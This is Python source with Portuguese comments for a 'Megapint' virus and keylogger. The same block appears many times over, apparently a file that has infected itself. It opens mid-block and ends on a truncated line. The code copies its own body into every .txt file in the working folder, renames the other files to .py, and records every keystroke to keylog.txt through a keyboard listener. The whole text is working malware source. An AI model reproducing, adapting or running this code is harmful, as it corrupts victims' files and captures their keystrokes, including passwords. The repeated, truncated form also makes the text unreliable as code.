    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
